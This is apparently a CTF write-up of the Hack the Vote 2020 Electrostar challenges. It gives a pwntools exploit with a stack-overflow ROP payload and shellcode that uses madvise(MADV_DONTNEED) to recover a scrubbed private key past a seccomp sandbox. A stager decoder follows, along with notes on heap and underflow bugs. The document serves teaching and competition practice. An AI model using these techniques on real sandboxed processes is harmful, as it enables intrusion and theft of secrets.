---
layout: post
title:  "Hack the Vote: Electrostar 1 + 2 (and thoughts on 3)"
date:   2020-10-27
author: nafod
tags: [ctf, pwning, reversing, userspace]
---

During this past weekend PFS participated in [Hack the Vote 2020](https://hackthe.vote/), a quadrennial CTF run by RPISEC. We ended up placing 2nd in the competition. During the event, I spent most of my time working on the Electrostar series of challenges, and ended up landing both parts 1 and 2. I also spent some time working on part 3, but didn't land it before the CTF ended.

## Challenge Overview

Electrostar consisted of a main userspace host binary and a series of small module files. You receive the challenge with the userspace and 3 module files. There are also 3 placeholder flags - two text files and one executable. The first two parts involve reading the two flag files, while the final part requires a full breakout and code execution in the context of the main machine binary. The entire challenge as-given is meant to run on Ubuntu 18.04 and a libc is also provided.

Thankfully, the challenge author [itszn](https://twitter.com/itszn13) also provided a few shell scripts to organize things. One called `connect.sh` connects you directly to the remote challenge with live flags, and another called `serve.sh` hosts a local instance of the challenge with socat on port 9000.

```bash=
#!/bin/bash

# serve.sh

chmod -r flag3.exe
/usr/bin/socat -d -d TCP-LISTEN:9000,reuseaddr,fork EXEC:"timeout -sKILL 300 env 
    ./machine modules/init_module.img.sig",pty,stderr,
    setsid,sigint,sighup,echo=0,sane,raw,ignbrk=1
```

## Part 1

We start things off by pulling apart the main `machine` binary in IDA. Since it comes with symbols and the challenge description is helpful, we already have a general idea that the modules are loaded and interact via some sort of IPC. But what do modules look like?

```c
struct {
    uint8_t signature_length;
    uint8_t signature[/* same length as above */];
    uint8_t flags;
    uint8_t module_dat[0];
} module;
```

The `flags` field contains only a few relevant fields, such as whether a module is the initial `init_module`, whether it wants an ncurses GUI (requiring some window setup/teardown), or whether it has a basic privilege level (required for hitting flag #2).

Modules are mapped into memory at the fixed address 0x500000 into an RWX region.

```c
void *__fastcall map_image(const void *a1, size_t a2)
{
  void *addr; // [rsp+28h] [rbp-8h]

  addr = (void *)map_page; // the value of map_page is 0x500000
  mmap((void *)map_page, (a2 & 0xFFFFFFFFFFFFF000LL) + 4096, 7, 50, 0, 0LL); // 7 == RWX
  if ( !has_gui )
    printf("DEBUG: Module mapped to %p\n\x1B[0m", addr);
  return memcpy(addr, a1, a2);
}
```

Once a module is loaded, the main sandbox provides a simple IPC handler command using pipe fds. Each process simply writes a command to its IPC pipe, where each command is a 2-byte length, a 4-byte command ID, and then message data. Modules also have the ability to send each other messages by having one module register to receive messages and another one send it, proxied through the machine itself.

```c
signed __int64 __fastcall read_ipc(struct module_t *a1)
{
  ssize_t v2; // rax
  unsigned __int16 len; // [rsp+12h] [rbp-1Eh]
  int v4; // [rsp+14h] [rbp-1Ch]
  unsigned __int64 i; // [rsp+18h] [rbp-18h]
  char *databuf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  len = 0;
  v4 = read(a1->pipes1, &len, 2uLL); // read command length
  if ( !v4 )
    return 0LL;
  if ( !len )
    return 0LL;
  databuf = (char *)calloc(len, 1uLL);
  if ( !databuf )
    return 0LL;
  for ( i = 0LL; i < len; i += v2 )
    v2 = read(a1->pipes1, &databuf[i], len - i); // read command data
  process_ipc(a1, databuf, len);
  return 1LL;
}
```

Finally, module files are signed; their contents are SHA256'd and the resulting data is protected by an ECDSA signature. Inside the `machine` binary provided as part of the game files, we have the public key which can verify signatures, but the private key has been overwritten (`"Private Key Scrubbed"`). This will come up again in part 2, so I'll touch on it more then.

However, none of this is actually immediately relevant, because we don't get direct access to these module or IPC details quite yet. Instead, when we run the `./serve.sh` script and connect, we're presented with the following interface (after some log messages)

```
    
                                          
                                          
     * President: Washington              
       President: Lincoln                 
       Submit                             
                                          
                                          
                                          
    
```

The basic functionality of this menu lets you select one (or both) of the presidents, and then select the "Submit" option which will clear the form.

The logic behind this application is in the `ballot_module.img.sig` module, which interfaces with the `gui_module.img.sig` module. Both of these are loaded by the `init_module`. `ballot_module` receives simple IPC messages from any other module and records the highest value byte in the message into a global array. It simply stores each byte sequentially in that memory region.

The `gui_module` is more immediately interesting, because it is responsible for rendering this ncurses menu. The main body of code inside it is as follows.

```c
__int64 __fastcall sub_84E(__int64 a1)
{
  void *v1; // rax
  int v2; // eax
  __int64 v4; // [rsp+10h] [rbp-70h]
  __int64 v5; // [rsp+18h] [rbp-68h]
  __int64 v6; // [rsp+20h] [rbp-60h]
  __int64 v7; // [rsp+28h] [rbp-58h]
  void *menu_items[2]; // [rsp+30h] [rbp-50h]
  __int64 v9; // [rsp+40h] [rbp-40h]
  __int64 v10; // [rsp+48h] [rbp-38h]
  int v11; // [rsp+50h] [rbp-30h]
  int v12; // [rsp+54h] [rbp-2Ch]
  __int64 v13; // [rsp+58h] [rbp-28h]
  int v14; // [rsp+64h] [rbp-1Ch]
  void *menu_obj; // [rsp+68h] [rbp-18h]
  int i; // [rsp+70h] [rbp-10h]
  int v17; // [rsp+74h] [rbp-Ch]
  int v18; // [rsp+78h] [rbp-8h]
  int needs_to_vote; // [rsp+7Ch] [rbp-4h]

  menu_items[0] = (void *)new_item("President:", "Washington");
  menu_items[1] = (void *)new_item("President:", "Lincoln");
  v9 = new_item("Submit", &byte_C4F);
  v10 = 0LL;
  menu_obj = (void *)new_menu();
  menu_opts_off((int)menu_obj, 1);
  set_menu_win();
  v1 = (void *)derwin(a1, 6, 38, 3, 1);
  set_menu_sub(menu_obj, v1);
  set_menu_mark(menu_obj, " * ");
  box((void *)a1, 0, 0);
  post_menu(menu_obj); // [ A ]
  refresh(menu_obj);
  needs_to_vote = 1;
  while ( 1 )
  {
    wrefresh();
    v14 = getch(); // [ B ]
    if ( v14 == -1 )
      break;
    switch ( v14 )
    {
      case 258:
        menu_driver((int)menu_obj, 515);        // DOWN
        break;
      case 259:
        menu_driver((int)menu_obj, 514);        // UP
        break;
      case 10:
      case 13:
        v13 = current_item();
        v12 = item_index();
        if ( v12 == 2 ) // [ C ]
        {
          if ( !needs_to_vote )
            goto LABEL_13;                      // do the submit
        }
        else
        {
          needs_to_vote = 0;
          menu_driver((int)menu_obj, 524);      // REQ_TOGGLE_ITEM
        }
        break;
    }
  }
LABEL_13:
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v18 = 0;
  v17 = 2;
  for ( i = 0; i <= 1; ++i )
  {
    LODWORD(v10) = item_value(menu_items[i]);
    v18 += v10;
    v2 = v17++;
    *((_BYTE *)&v4 + v2) = i;
  }
  LOBYTE(v4) = v18;
  v11 = 15;
  SHIDWORD(v10) /= v18;
  BYTE1(v4) = BYTE4(v10);
  submit_vote_req(10, (__int64)&v4, 32);
  return unpost_menu((int)menu_obj);
}
```

While this seems like a lot, I've highlighted a few interesting portions. At [ A ] the system creates an ncurses menu and populates it with the options. At [ B ], it has entered a loop to receive keyboard inputs to navigate the menu - 258 and 259 are terminal control codes which correspond to the DOWN and UP arrow keys. Hitting enter goes into a brief check where at [ C ] it checks if you have selected the "Submit" option. If you have not, it will mark `needs_to_vote` as 0 and toggle the selected value on that menu option. If you have, it will check if you have ever selected something and if so, generate an IPC message to send.

The bug here is that you can toggle menu options, so toggling an option on and off results in an `item_value` of 0, but with a zero `needs_to_vote` flag. This causes a SIGFPE when calculating `SHIDWORD(v10) /= v18`, which in turn causes the `gui_module` to crash.

Luckily for us, the fallback in this application is an interface that lets us send raw IPC messages into the `ballot_module` pipe - how convenient!

```c
__int64 __fastcall process_ipc_data(char *data)
{
  void *v1; // rsp
  signed __int64 v2; // rax
  __int64 idx; // rax
  __int64 v4; // [rsp+0h] [rbp-50h]
  int v6[2]; // [rsp+18h] [rbp-38h]
  char *v7; // [rsp+20h] [rbp-30h]
  __int64 v8; // [rsp+28h] [rbp-28h]
  unsigned __int8 v9; // [rsp+36h] [rbp-1Ah]
  unsigned __int8 highest_val; // [rsp+37h] [rbp-19h]
  unsigned __int64 i; // [rsp+38h] [rbp-18h]

  v9 = *data;
  v8 = (char)v9 - 1LL;
  v1 = alloca(16 * (((char)v9 + 15LL) / 0x10uLL)); // [ A ]
  v7 = (char *)&v4;
  if ( v9 > 0x63u )
    v2 = 100LL;
  else
    v2 = (unsigned int)(char)v9;
  *(_QWORD *)v6 = v2;
  memcpy(v7, data + 1, v2); // [ B ]
  highest_val = 0;
  for ( i = 0LL; i < *(_QWORD *)v6; ++i )
  {
    if ( v7[i] > (unsigned int)highest_val )
      highest_val = v7[i];
  }
  LOBYTE(idx) = dword_2040++;
  idx = (unsigned __int8)idx;
  byte_2060[(unsigned __int8)idx] = highest_val;
  return idx;
}
```

Inside `ballot_module`'s `process_ipc_data` function, it performs a stack `alloca()` call based on the first byte of input, which it treats as a signed value. Since it's signed, this is another bug; we can blow out the expectation of where the stack data will be allocated by passing a value greater than 0x7f. Afterwards, our raw payload will be copied to the stack, giving us control of pc (modules have no stack canaries). Obtaining the flag is straightforward from here, since the module provides a `print_part1_flag` function we can jump to, but which is never otherwise called.

```python
from pwn import *
from pwnlib.util.proc import pid_by_name

context.binary = "./machine"
#context.log_level = "CRITICAL"
context.log_level = "DEBUG"

p = process("./connect.sh", stdin=PTY, stdout=PTY, raw=True)
pemptr = int(p.recvline().strip(), 16)
p.recvuntil("Starting GUI module")

#gdb.attach(sorted(pid_by_name("machine_patched"))[3], gdbscript="""
#b *getch
#c
#""")

p.recvuntil("Submit")

print("here we go")
print(hex(pemptr))

p.send("\x0a")
p.send("\x0a")

# these are encodings for terminal contrl codes
p.send_raw("\33OB") # DOWN
p.send("\x0a")
p.send("\x0a")
p.send_raw("\33OB") # DOWN
p.send("\x0a")

p.recvuntil("STDIN")
p.recvline()
# gui_module crashed, we can we can now send raw ipc

# get pc inside balloT_module
payload = "\xff" + cyclic(24) + "\x00"*8
payload += p64(0x500000)
payload += p64(0x500741)*8 # one of these will be pc ;)
payload = payload.ljust(100, "A")
p.send(payload)

p.recvuntil("Here is your flag")
print(p.recvuntil("}"))
p.recvall()
```

```flag: flag{in rwx no one can hear you scream}```

## Part 2

After some finagling in part 1, we obtain execution in the context of `ballot_module`. And, even though I actually ropped in the first part, we can get full shellcode execution without any extra work in this stage simply by casting each byte of shellcode as a vote. In `process_ipc_data` above, it will store whatever byte you pass it in your message into a global array and then increment the dest ptr.

We do have to send each part 1 byte at a time though, so I wrote a quick stager shellcode to make an IPC request for a larger chunk of bytes to then jump to. Progress!

From here, we can examine the code required to make an IPC call to retrieve the second flag:

```c
if ( opcode == 1337 ) /* first flag */
{
  stream = fopen("flag1.txt", "r");
  fgets(&s, 64, stream);
  fclose(stream);
  printf("\x1B[92m[Module %u] Here is your flag #1: %s\n\x1B[0m", a1->pid, &s);
}
else if ( opcode == 31337 ) /* second flag */
{
  if ( a1->flags & 1 )
  {
    v4 = fopen("flag2.txt", "r");
    fgets(&s, 64, v4);
    fclose(v4);
    printf("\x1B[92m[Module %u] Here is your flag #2: %s\n\x1B[0m", a1->pid, &s);
  }
  else
  {
    printf("\x1B[93mWARN: Module %u does not have permission for command 31337\n\x1B[0m", a1->pid);
  }
}
```

Reading the second flag requires our module to have `a1->flags & 1`, which we do not have. Also, the hint for this challenge states: `Hint: For flag2 you may want to recover the private key...`. So, we probably want to recover the private key from the binary and generate our own signed module with that flag set.

So - when modules are loaded, they're just forked off of the machine process which contains the private key (at least, the version on the server does). So how does the binary prevent us from just reading it out of our own process?

```c
__int64 init_ec()
{
  __int64 result; // rax

  private_pem_p = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
  if ( !private_pem_p )
  {
    puts("\x1B[91mCould not map for key\x1B[0m");
    exit(1);
  }
  if ( madvise(private_pem_p, 0x1000uLL, 18) )  // MADV_WIPEONFORK
  {
    puts("\x1B[91mCould not map for key\x1B[0m");
    exit(1);
  }
  printf("%p\n", private_pem_p);
  memcpy(private_pem_p, private_pem, (unsigned int)private_pem_len);
  memset(private_pem, 0, (unsigned int)private_pem_len);
  curve = EC_GROUP_new_by_curve_name(713LL, 0LL);
  result = curve;
  if ( !curve )
  {
    puts("\x1B[91mERROR: Failied to load curve:\x1B[0m");
    ERR_print_errors_fp(stdout);
    exit(1);
  }
  return result;
}
```

`init_ec` is invoked very early in the lifecycle of the program and is responsible for creating a random mapping, marking it as `MADV_WIPEONFORK`, and printing out that memory address. Note that `MADV_WIPEONFORK` causes the page to be wiped to all nulls when we fork. Afterwards, the private key is copied from the program's data into that mapping and memset to 0 in the data section. In other words, we don't have it in our own process data section, nor do we have it in the mapping (because of `MADV_WIPEONFORK`).

There is some further "memory cleaning code" that is worth examining.

```c
unsigned __int64 __fastcall clean(struct module_t *a1)
{
  unsigned int v1; // eax
  __int64 v3; // [rsp+0h] [rbp-70h]
  struct module_t *v4; // [rsp+8h] [rbp-68h]
  void *ptr; // [rsp+18h] [rbp-58h]
  size_t n; // [rsp+20h] [rbp-50h]
  void *v7; // [rsp+28h] [rbp-48h]
  struct module_t *v8; // [rsp+30h] [rbp-40h]
  FILE *stream; // [rsp+38h] [rbp-38h]
  char s1[8]; // [rsp+40h] [rbp-30h]
  __int64 v11; // [rsp+48h] [rbp-28h]
  __int64 v12; // [rsp+50h] [rbp-20h]
  __int64 v13; // [rsp+58h] [rbp-18h]
  unsigned __int64 v14; // [rsp+68h] [rbp-8h]

  v4 = a1;
  v14 = __readfsqword(0x28u);
  if ( !has_gui )
  {
    v1 = getpid();
    printf("[Module %u] Scrubbing process for security\n", v1);
  }
  v8 = ipc_head;
  if ( ipc_head )
    v8 = (struct module_t *)v8->prev_ptr;
  while ( v8 )
  {
    if ( v8 != v4 )
    {
      close(v8->pipes1); // [ A ]
      close(v8->pipe1write);
      close(v8->pipes2);
      close(v8->pipe2write);
    }
    v8 = (struct module_t *)v8->prev_ptr;
  }
  stream = fopen("/proc/self/maps", "r");
  ptr = 0LL;
  n = 0LL;
  *(_QWORD *)s1 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  do
  {
    if ( getline((char **)&ptr, &n, stream) == -1 )
      break;
    __isoc99_sscanf(ptr, "%lx-%*x %*4c %*x %*x:%*x %*u %7s", &v7, s1);// find the stack
    free(ptr);
    ptr = 0LL;
  }
  while ( strcmp(s1, "[stack]") ); // [ B ]
  enable_sandbox(); // [ C ]
  memset(v7, 0, (char *)&v3 - (_BYTE *)v7);     // wipe everything below us on the stack
  return __readfsqword(0x28u) ^ v14;
}
```

This function runs post-fork but before the module obtains execution. At [ A ], we close any pipes which correspond to communication channels with other modules. At [ B ], the machine scans for its own stack mapping in memory by reading `/proc/self/maps`. After ending the function, it will memset everything on the stack below this functions execution to 0, ostensibly to prevent leaking data onto the stack from spilled registers. Finally, in [ C ] it loads the following seccomp profile (for which source was provided):

```c
void enable_sandbox() {
    // Init the filter
    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL); // default action: kill
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(poll), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigaction), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigprocmask), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(readv), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(writev), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(pipe), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(select), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mremap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(madvise), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(nanosleep), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(alarm), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getpid), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(gettimeofday), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getuid), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getgid), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(geteuid), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getegid), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(futex), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(set_thread_area), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(get_thread_area), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(ioctl), 1,
                                                    SCMP_A0(SCMP_CMP_EQ, 1));

    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(ENOENT), SCMP_SYS(stat), 0);

    seccomp_load(ctx);
}
```

This is a lot of functions! Unfortunately, we can't `open(2)` or similar functions, so we can't directly read the flag or the private key. However, we still have a lot of random functions, some of which seem out of place.

### madvise

Ultimately, I spent a lot of time trying out different ideas. I noticed a few file descriptor leaks from the machine to our module - it never closes `/proc/self/maps`, for example. We can also cause it to open arbitrary files by requesting the IPC service load that path as a module. If the first byte of the file we open is `<0x40`, it will actually dump the corresponding number bytes to stdout as a hex-encoded signature. Unfortunately, I couldn't figure out a way to leverage either of these patterns to leak the flag.

Eventually I turnd my attention to the allowed syscalls in the seccomp profile and had a realization - what happens if you call `madvise(addr, 0x1000, MADV_DONTNEED)` on a file-backed memory region that you have written to? Remember, the program overwrite the private key inside its own file-backed data section with null bytes.

Intuitively I expected one of the following behaviors to happen:

1. The system destroys the mapping and next time you access it, you get null data
2. The system forks the vma and disassociates it from the file, possibly spilling it to a pagefile until you cause a page fault

However, what actually happens is that the system reloads that page of the file from disk, _as it was on disk_! So all we have to do is to invoke `madvise(data_page_with_private_key, 0x1000, MADV_DONTNEED)` and we can read out the private key from our own memory. Very cool trick :)

```asm=
nop

; our thrower patches this value with the `private_pem_p` we are given,
; and we will use this as a helpful scratch buffer
mov r12, 0x0807060504030201

; leak base
mov rax, [0x502120]
mov rax, [rax+0x28]
sub rax, 0x206280

; move forward to the database 
add rax, 0x206000
mov r14, rax
add r14, 0x20

; madvise the mapping
mov rdi, rax
mov rsi, 0x1000
mov rdx, 4
call madvise

; grab its length
mov rdi, r14
call strlen
mov r13, rax

; copy it into our temp buffer
mov rdi, r12
mov rsi, r14
mov rdx, r13
call memcpy

; send the ipc message to print out the value
mov rdi, 1
mov rsi, r12
mov rdx, r13
call ipc

perma:
jmp perma

ipc:
mov rax, 0x500406
jmp rax

memcpy:
mov rax, 0x5002E8
jmp rax

strlen:
mov rax, 0x5002D0
jmp rax

madvise:
mov rax, 0x1c
syscall
ret
```

```
-----BEGIN EC PRIVATE KEY-----
MGgCAQEEHFOoXTFtgQ2GbWqDNlPLZm2mIiZaIRT0YaL4vb2gBwYFK4EEACGhPAM6
AARpzCU89v2W6PVX5V7YalhfQV2w++qp5clllv7w71oXfoMVhNuq9KwCMwGQ+8O4
MoqoZXO1iBFOGg==
-----END EC PRIVATE KEY-----
```

Once we've leaked the key, we can patch it into our own local binary where it should go. The local binary provides a convenient command line option to sign payloads as desired. All that is left is to transmit our payload to the server. `socat` is unhappy with certain bytes (e.g. 0x03) which the challenge authors use as an EOF byte. The IPC mechanism itself for reading in data breaks on newlines. Therefore, I actually used a stager payload to receive my module file and un-encode those special bytes from it.

```c
; this value is patched to the number of encoded bytes
mov rdi, 0x5555555555555555
call read_bytes
mov r14, rax

; process it and copy it to the right buffer
; this value is patched to the number of decoded bytes
mov rdi, 0x5656565656565656
call malloc
mov r15, rax

; INPUT LENGTH
mov r8, 0x5555555555555555

; OUTPUT LENGTH
mov r9, 0x5656565656565656

; output counter
mov rdx, 0

; input counter
mov rbx, 0
loopstart:
cmp rbx, r8
je loopdone

mov eax, [r14+rbx]
cmp eax, 0x41414143
je three
cmp eax, 0x41414144
je newline
jmp normal

newline:
mov rax, 0x0b
sub rax, 1
mov [r15+rdx], al
add rbx, 4
jmp loopbottom

three:
mov rax, 0x04
sub rax, 1
mov [r15+rdx], al
add rbx, 4
jmp loopbottom
nop

normal:
mov [r15+rdx], al
add rbx, 1
jmp loopbottom

loopbottom:
; always increment the output counter
add rdx, 1
jmp loopstart

loopdone:
mov rdi, 21
mov rsi, r15
mov rdx, 0x5656565656565656
call ipc
```

After this jerry-rigging, we obtain the flag for part 2!

```flag: flag{https://www.youtube.com/watch?v=bg6-LVCHmGM&t=3929}```

## Part 3

I didn't actually solve part 3, but I found 3 interesting bugs which I assume are at least partially related to pwning the process. It should be noted that we don't need any leaks, since we have execution in a forked copy of the process and so can figure everything out ourselves (plus, it hands us a pointer to `dlsym` as an argument when it jumps to our code)

- The IPC handler for opcode 50 contains an obvious signed underflow bug. Not only is this method clearly intended to be abused, it's also convenient. The primitive allows us to write a fully controlled qword at any negative offset below the `record_array`, which is located in bss. Interesting targets there include `stdin/stdout/stderr FILE *` pointers, which we can leverage for FSOP on this version of libc.

```c
if ( opcode == 50 )
{
  if ( !(a1->flags & 4) )
  {
    printf("\x1B[93mWARN: Only the init module can call command 50\n\x1B[0m", databuf);
    return __readfsqword(0x28u) ^ v12;
  }
  if ( datalength <= 0xF )
    return __readfsqword(0x28u) ^ v12;
  v9 = *((_DWORD *)databuf + 1); // controlled index
  if ( v9 > 31 ) // signed comparison
  {
    printf("\x1B[93mWARN: Command 50 out of bounds!\n\x1B[0m", databuf);
    return __readfsqword(0x28u) ^ v12;
  }
  record_array[v9] = *((_QWORD *)databuf + 1); // controlled qword written
}
```

- In opcode 2's handler, there are some lifetime issues around the module header chunk

```c
else if ( opcode == 2 )
{
  if ( waiting_for_input )
  {
    write(a1->pipe2write, 0LL, 2uLL);
  }
  else if ( datalength > 5 )
  {
    waiting_for_input = a1; // save a pointer to our module chunk in a global
    input_read_len = *((unsigned __int16 *)databuf + 2);
    check_gui_output(0LL, 0LL);
  }
}
```

```c
void __fastcall check_gui_output(void *a1, size_t a2)
{
  size_t datalen; // [rsp+0h] [rbp-20h]
  void *databuf; // [rsp+8h] [rbp-18h]
  char *s; // [rsp+18h] [rbp-8h]

  databuf = a1;
  datalen = a2;
  if ( a1 || !waiting_for_input || has_gui )
  {
    if ( databuf ) // this is 0 in the above call, so we fall through here
    {
      if ( waiting_for_input )
      {
        if ( datalen > input_read_len )
          datalen = input_read_len;
        write(waiting_for_input->pipe2write, &datalen, 2uLL);
        write(waiting_for_input->pipe2write, databuf, datalen);
        waiting_for_input = 0LL;
      }
      else
      {
        puts("\x1B[93mWARN: GUI process has no pipe connected, data lost\x1B[0m");
      }
    }
  }
  else
  {
    puts("\x1B[93mWARN: No GUI process, falling back to STDIN\x1B[0m");
    s = (char *)calloc(input_read_len, 1uLL);
    fgets(s, input_read_len, stdin);
    write(waiting_for_input->pipe2write, &input_read_len, 2uLL);
    write(waiting_for_input->pipe2write, s, input_read_len);
    free(s);
    waiting_for_input = 0LL;
  }
}
```

`waiting_for_input` is never unset, and will be freed if the module exits. This means we can, at the very least, probably control which file descrpitor arbitrary data is written to as part of `waiting_for_input->pipe2write`

- Inside the module loading code, there is a `free(3)` of possibly uninitialized stack data. This occurs when a module is loaded that fails one of the checks _prior_ to signature validation. The chunk that is freed is supposed to be the calculated module hash. The easiest way to trigger this is to try to load a file whose first byte is >0x40. Most of the time, you will segfault by freeing garbage. However, by a special series of opcodes (opcode 10, followed by the bug trigger) I could get a free of an already-freed 0x20 heap chunk.

Unfortunately, I wasn't able to turn this around fast enough before the competition ended. The game plan was to spray chunks prior to the trigger to ensure our double freed chunk would be in the tcache, allowing for arbitrary chunk allocation easily. However, the act of spraying was causing sufficient churn on my stack as to break the primitive and I ran out of time.

## Parting Thoughts

Electrostar was an awesome series of challenges. Learning about madvise is cool, and so are creative pwns. Shoutout to itszn for a great challenge, and all of RPISEC for hosting a very cool event. See you all in 4 years :)?
